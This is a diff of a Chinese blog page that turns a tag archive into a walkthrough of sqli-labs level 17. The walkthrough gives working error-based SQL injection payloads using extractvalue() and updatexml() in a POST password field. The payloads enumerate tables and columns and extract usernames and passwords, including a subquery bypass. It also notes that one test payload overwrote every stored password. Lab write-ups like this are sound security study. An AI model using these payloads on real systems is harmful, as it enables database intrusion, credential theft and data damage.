@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    Tag: sqli-lab |  你好，陌生人
+    sqli-lab less-17 |  你好，陌生人
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -43,90 +43,208 @@
       
     <main class="content on">
       <section class="outer">
-  <article class="articles">
+  <article
+  id="post-sqli-lab-less-17"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
     
-    
-    <h1 class="page-type-title">#&nbspsqli-lab</h1>
-    
-    
-  
-  
-  
-  
-  
-  
-  <div class="archives-wrap">
-    <div class="archive-year-wrap">
-      <a href="/archives/2020" class="archive-year">2020</a>
-    </div>
-    <div class="archives">
-      
-      <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2020/07/27/sqli-lab-less-17/" class="archive-article-date">
-  <time datetime="2020-07-27T13:13:52.000Z" itemprop="datePublished">07/27</time>
-</a>
+    <header class="article-header">
        
-<h2 itemprop="name">
-  <a class="archive-article-title" href="/2020/07/27/sqli-lab-less-17/"
-    >sqli-lab less-17</a> 
-</h2>
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  sqli-lab less-17
+</h1>
  
 
     </header>
-    
-    
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqli-lab/" rel="tag">sqli-lab</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+     
+    <div class="article-meta">
+      <a href="/2020/07/27/sqli-lab-less-17/" class="article-date">
+  <time datetime="2020-07-27T13:13:52.000Z" itemprop="datePublished">2020-07-27</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">565</span>
+        </span>
+    </span>
 
-    
-  </div>
-</article>
-      
-  
-  
-  
-  </div>
-  </div>
-  
-  
-  <div class="archives-wrap">
-    <div class="archive-year-wrap">
-      <a href="/archives/2019" class="archive-year">2019</a>
-    </div>
-    <div class="archives">
-      
-      <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2019/12/25/sqli-lab/" class="archive-article-date">
-  <time datetime="2019-12-25T07:01:37.000Z" itemprop="datePublished">12/25</time>
-</a>
-       
-<h2 itemprop="name">
-  <a class="archive-article-title" href="/2019/12/25/sqli-lab/"
-    >sqli-labs(1-4)</a> 
-</h2>
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">2 min</span>
+        </span>
+    </span>
+</div>
  
-
-    </header>
-    
-    
+    </div>
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqli-lab/" rel="tag">sqli-lab</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
-
-    
-  </div>
-</article>
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>17关相比于之前关卡有很大不同，这一关注入点在密码上<br>一开始并没有任何思绪，于是只能观察源码</p>
+<a id="more"></a>    
+<p><img src="/2020/07/27/sqli-lab-less-17/image1.png" alt><br>从源码中可以看到：接收到用户POST的uname和passwd后，首先根据uname查询数据库的username和password，若uname存在则用passwd替换password，若不存在则显示slap1.jpg</p>
+<p>这一关使用报错注入<br>一般常用的报错注入有updatexml()、 extractvaule()和floor(),在这里floor()函数用不了<br>剩下两个都可以用，首先介绍下两个函数的用法<br>1、updatexml()<br> UpdateXML(xml_target, xpath_expr, new_xml)<br>这是updatexml()的基本用法，可以看出需要三个参数<br>第一个参数是目标是针对于xml文档<br>第二参数是xpath的表达<br> 第三个参数是将xpath表达式转换成什么，也就是替换查找到的符合条件的数据<br>2、 extractvaule()<br>extractvalue(目标xml文档，xml路径)<br>这里第二个参数的位置就是可以操作的地方<br>这里用采用第2种方法<br>–查表<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>–查列<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>–查用户名<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select password from users limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>在查找用户名的时候出现了问题</p>
+<p><img src="/2020/07/27/sqli-lab-less-17/image.png" alt>    </p>
+<p>报错了，通过查询换代码发现，后台限制了对users表的查询，不可以查询此表，因此我们可以将其换一个名字</p>
+<p>–绕过<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select username from (select username from users)a limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>–查密码<br>uname=admin&amp;passwd=111’ and extractvalue(1,concat(0x7e,(select password from (select password from users)a limit 0,1),0x7e)) and ‘1&amp;submit=submit</p>
+<p>这里有一个问题， UpdateXML(xml_target, xpath_expr, new_xml)这个函数，第一、三参数是string类型</p>
+<p>我测试时采用了这个payload ：aa’ and updataxml(0x7e,(concat(1,(select table_name from information_schema.tables where table_schema=database() limit 1,1),1),1)#<br>于是我的数据库中的密码的值全部变成了1。。。</p>
+<p>在实际环境中，这样的测试肯定是不行的，所以尽可能不将参数设为int型</p>
+ 
+      <!-- reward -->
       
+      <div id="reward-btn">
+        Donate
+      </div>
       
     </div>
-  </div>
-  
-  
+    
 
-  
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/07/27/sqli-lab-less-17/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqli-lab/" rel="tag">sqli-lab</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/04/02/buuctf-web-easy-calc-wirteup/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">buuctf web easy calc wirteup</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+     
+</article>
+
 </section>
       <footer class="footer">
   <div class="outer">
